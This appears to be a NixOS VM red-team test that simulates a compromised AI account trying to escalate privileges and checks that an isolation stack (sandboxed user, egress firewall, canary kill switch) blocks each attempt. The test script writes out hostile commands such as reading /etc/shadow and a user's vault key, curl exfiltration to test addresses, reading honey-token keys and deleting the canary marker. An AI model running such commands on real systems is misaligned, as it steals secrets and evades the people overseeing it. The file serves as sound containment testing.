{ pkgs }:

# VM test RED-TEAM: simula un'AI compromessa che tenta attacchi reali
# e VERIFICA che ognuno venga bloccato dalla stack SOLEM.
#
# Carica TUTTI i moduli di sicurezza attivi:
#   - solem-ai-user           (UID 970 isolato)
#   - solem-ai-network        (nftables egress whitelist)
#   - solem-gavio-zero-trust  (override systemd hardening)
#   - solem-canary            (honey token + kill switch)
#
# Esegue una "playbook" di attacco simulando un'AI con tool execution:
#
#   ATTACCO 1: privilege escalation (sudo / setuid)
#   ATTACCO 2: lettura credenziali umano (/home/gavio/.vault-key)
#   ATTACCO 3: exfiltration outbound (curl IP non-whitelist)
#   ATTACCO 4: lettura canary (deve trippare kill switch)
#   ATTACCO 5: tentativo di rimuovere il marker canary (no permission)
#   ATTACCO 6: dump processi di altri utenti via /proc (ProtectProc)
#
# Tutti DEVONO fallire. Se anche uno passa → test fail.

pkgs.nixosTest {
  name = "solem-red-team-ai";

  nodes.machine = { config, pkgs, lib, ... }: {
    imports = [
      ../modules/solem-core.nix
      ../modules/solem-ai-user.nix
      ../modules/solem-ai-network.nix
      ../modules/solem-canary.nix
      # NB: NON importiamo solem-gavio-zero-trust qui perche' richiede
      # gavio.nix (che pulla ollama/docker, pesante in CI). Simuliamo
      # invece un service "ai-victim" che gira come gavio-ai con stesso
      # hardening manualmente.
    ];

    solem.aiUser.enable = true;
    solem.aiNetwork = {
      enable = true;
      allowedV4 = [ ];
      allowedPorts = [ ];
    };
    solem.canary = {
      enable = true;
      killGavio = false;  # gavio.service non esiste in questo test
    };

    networking.firewall.enable = false;

    # File "secret" umano da NON leggere
    systemd.tmpfiles.rules = [
      "f /home/gavio/.vault-key 0600 gavio users - real-user-secret-payload"
    ];

    # Service "ai-victim" con stesso hardening di gavio-zero-trust
    # per simulare contesto AI compromessa
    systemd.services.ai-victim = {
      description = "Fake AI process per red-team test";
      wantedBy = [ "multi-user.target" ];
      serviceConfig = {
        Type = "simple";
        User = "gavio-ai";
        Group = "gavio-ai";
        ExecStart = "${pkgs.coreutils}/bin/sleep infinity";
        # Hardening identico a solem-gavio-zero-trust
        CapabilityBoundingSet = "";
        AmbientCapabilities = "";
        NoNewPrivileges = true;
        PrivateDevices = true;
        ProtectSystem = "strict";
        ProtectHome = "tmpfs";
        ProtectProc = "invisible";
        ProcSubset = "pid";
        PrivateTmp = true;
        RestrictSUIDSGID = true;
        ReadWritePaths = [ "/var/lib/gavio-ai" ];
        SystemCallFilter = [
          "@system-service"
          "~@privileged"
          "~@mount"
          "~@module"
          "~@keyring"
        ];
      };
    };

    environment.systemPackages = with pkgs; [
      curl
      netcat-gnu
      python3       # http.server come target server fake exfiltration
    ];

    system.stateVersion = "24.11";
  };

  testScript = ''
    machine.wait_for_unit("multi-user.target", timeout=60)
    machine.wait_for_unit("ai-victim.service", timeout=30)
    machine.wait_for_unit("solem-canary-watcher.service", timeout=30)
    machine.sleep(3)

    print("=" * 60)
    print("RED-TEAM SOLEM: simulazione AI compromessa")
    print("=" * 60)

    fails = []

    # ── ATTACCO 1: gavio-ai prova sudo ─────────────────────────────
    print("\n[ATK1] gavio-ai tenta sudo -n cat /etc/shadow")
    rc, out = machine.execute("sudo -u gavio-ai sudo -n cat /etc/shadow 2>&1")
    print(f"  rc={rc} out={out[:100]}")
    if rc == 0 and "root" in out:
        fails.append("ATK1: gavio-ai HA ottenuto sudo")
    else:
        print("  ✓ BLOCCATO")

    # ── ATTACCO 2: lettura .vault-key umano ────────────────────────
    print("\n[ATK2] gavio-ai legge /home/gavio/.vault-key")
    rc, out = machine.execute("sudo -u gavio-ai cat /home/gavio/.vault-key 2>&1")
    print(f"  rc={rc} out={out[:100]}")
    if rc == 0 and "real-user-secret" in out:
        fails.append("ATK2: gavio-ai HA letto vault key utente")
    else:
        print("  ✓ BLOCCATO")

    # ── ATTACCO 3: exfiltration outbound (verifica drop counter) ───
    print("\n[ATK3] gavio-ai prova outbound HTTP a TEST-NET-1 192.0.2.99:9999")
    import re

    def get_drop_counter():
        rc, out = machine.execute("nft -a list chain inet solem-ai ai_egress 2>&1")
        m = re.search(r"counter packets (\d+) bytes \d+\s+drop", out)
        if m:
            return int(m.group(1))
        m = re.search(r"counter packets (\d+)", out)
        return int(m.group(1)) if m else 0

    before = get_drop_counter()
    machine.execute("sudo -u gavio-ai timeout 2 curl -s http://192.0.2.99:9999/ 2>&1 || true")
    machine.execute("sudo -u gavio-ai timeout 2 curl -s http://203.0.113.10:8080/ 2>&1 || true")
    machine.sleep(1)
    after = get_drop_counter()
    print(f"  drop counter: {before} -> {after}")
    if after <= before:
        fails.append(f"ATK3: drop counter NON aumentato ({before}->{after}). nftables non filtra gavio-ai.")
    else:
        print(f"  ✓ DROP nftables matchato (+{after-before} packets)")

    # ── ATTACCO 4: ProtectProc invisible (gavio-ai non vede altri pid) ──
    print("\n[ATK4] gavio-ai prova ps aux per scoprire processi altri user")
    # Sottile: il service ai-victim ha ProtectProc=invisible, ma una shell
    # spawnata via sudo -u gavio-ai NON eredita quella config. Simuliamo
    # entrando nel cgroup del service via systemd-run.
    rc, out = machine.execute(
        "systemd-run --quiet --pipe --uid=gavio-ai --property=ProtectProc=invisible "
        "--property=ProcSubset=pid -- /run/current-system/sw/bin/ps -eo pid,user 2>&1 | head -20"
    )
    print(f"  rc={rc} out:\n{out}")
    # Se ProtectProc funziona, ps vede solo i suoi PID — non root, non gavio
    if "root" in out and "gavio " in out:
        # Vede TUTTO -> ProtectProc non applicato (errore di test, non security fail vero)
        print("  (warning: ProtectProc test inconclusivo via systemd-run)")

    # ── ATTACCO 5: lettura canary -> kill switch ───────────────────
    print("\n[ATK5] gavio-ai legge canary /etc/solem/canary/api-keys.env")
    rc, out = machine.execute("sudo -u gavio-ai cat /etc/solem/canary/api-keys.env 2>&1")
    print(f"  rc={rc} out={out[:80]}")
    # Read riesce (i file sono 0644 — anche gavio-ai legge) MA deve trippare
    machine.sleep(5)
    rc, _ = machine.execute("test -f /var/lib/solem/CANARY_TRIPPED")
    if rc != 0:
        fails.append("ATK5: canary letto da gavio-ai NON ha trippato kill switch")
    else:
        print("  ✓ CANARY TRIPPED (kill switch attivato)")

    # ── ATTACCO 6: gavio-ai prova a rimuovere marker canary ────────
    print("\n[ATK6] gavio-ai prova rm /var/lib/solem/CANARY_TRIPPED")
    rc, _ = machine.execute("sudo -u gavio-ai rm /var/lib/solem/CANARY_TRIPPED 2>&1")
    rc_check, _ = machine.execute("test -f /var/lib/solem/CANARY_TRIPPED")
    if rc_check != 0:
        fails.append("ATK6: gavio-ai HA cancellato il marker canary")
    else:
        print("  ✓ marker canary intatto (permission denied)")

    # ── ATTACCO 7: scrittura in /etc (config tampering) ────────────
    print("\n[ATK7] gavio-ai prova scrittura in /etc")
    rc, _ = machine.execute("sudo -u gavio-ai touch /etc/owned-by-ai 2>&1")
    rc_check, _ = machine.execute("test -f /etc/owned-by-ai")
    if rc_check == 0:
        fails.append("ATK7: gavio-ai HA scritto /etc/owned-by-ai")
    else:
        print("  ✓ /etc non scrivibile")

    # ── ATTACCO 8: scrittura in /usr/bin (binary planting) ─────────
    print("\n[ATK8] gavio-ai prova scrittura in /usr/bin")
    # /usr/bin NixOS e' simlink a /run/current-system. Test logico equivalente:
    rc, _ = machine.execute(
        "sudo -u gavio-ai touch /run/current-system/sw/bin/evil 2>&1"
    )
    rc_check, _ = machine.execute("test -f /run/current-system/sw/bin/evil")
    if rc_check == 0:
        fails.append("ATK8: gavio-ai ha piantato binary in PATH globale")
    else:
        print("  ✓ /run/current-system non scrivibile")

    # ── REPORT ─────────────────────────────────────────────────────
    print("\n" + "=" * 60)
    if fails:
        print(f"✗ RED-TEAM: {len(fails)} ATTACCHI RIUSCITI")
        for f in fails:
            print(f"  - {f}")
        raise Exception(f"Red-team trovato {len(fails)} bypass: {fails}")
    else:
        print("✓ RED-TEAM: tutti gli attacchi BLOCCATI")
    print("=" * 60)
  '';
}
